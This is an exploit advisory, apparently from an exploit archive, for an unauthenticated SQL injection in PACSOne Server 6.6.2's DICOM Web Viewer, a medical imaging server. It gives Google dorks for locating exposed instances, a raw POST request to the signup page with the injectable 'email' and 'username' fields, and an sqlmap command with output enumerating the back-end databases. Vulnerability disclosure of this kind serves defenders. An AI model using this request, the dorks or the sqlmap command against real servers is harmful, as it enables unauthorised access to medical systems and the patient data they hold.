@@ -1,0 +1,57 @@
+# Exploit Title: PACSOne Server 6.6.2 DICOM Web Viewer SQL Injection
+# Date: 08/14/2017
+# Software Link: http://www.pacsone.net/download.htm
+# Version: PACSOne Server 6.6.2
+# Exploit Author: Carlos Avila
+# Google Dork: inurl:pacs/login.php	inurl:pacsone/login.php		inurl:pacsone filetype:php home		inurl:pacsone filetype:php login
+# Category: webapps
+# Tested on: Windows 7 / Debian Linux
+# Contact: http://twitter.com/badboy_nt
+
+1. Description
+  
+DICOM Web Viewer is a component written in PHP. In version 6.6.2, it is vulnerable to SQL Injection. This allows unauthenticated remote attacker to execute arbitrary SQL commands and obtain private information. Admin credentials aren't required.
+The 'username' and 'email' parameters via POST are vulnerable.
+
+Found: 08/14/2017
+Last Vendor Reply & Fix: 09/28/2017
+  
+2. Proof of Concept
+
+
+POST /pacs/userSignup.php HTTP/1.1
+Host: 192.168.6.105
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:54.0) Gecko/20100101 Firefox/54.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 206
+Referer: http://192.168.6.105/pacs/userSignup.php?hostname=localhost&database=dicom
+Cookie: PHPSESSID=k0ggg80jcl6m61nrmp12esvat2
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+hostname=localhost&database=dicom&username=test&password=22222222&firstname=test&lastname=test&email=test&action=Sign+Up
+
+
+root@kali18:~# sqlmap -r pacsone_local -v 2 -f -p email --dbms mysql –dbs
+
+web server operating system: Windows
+web application technology: Apache 2.4.23, PHP 5.6.25
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+               comment injection fingerprint: MySQL 5.7.14
+               html error message fingerprint: MySQL
+[20:09:33] [INFO] fetching database names
+[20:09:33] [INFO] the SQL query used returns 2 entries
+[20:09:33] [INFO] retrieved: information_schema
+[20:09:33] [INFO] retrieved: dicom
+[20:09:33] [DEBUG] performed 3 queries in 0.11 seconds
+available databases [2]:
+[*] dicom
+[*] information_schema
+
+
+3. Solution:
+
+Application inputs must be validated correctly.
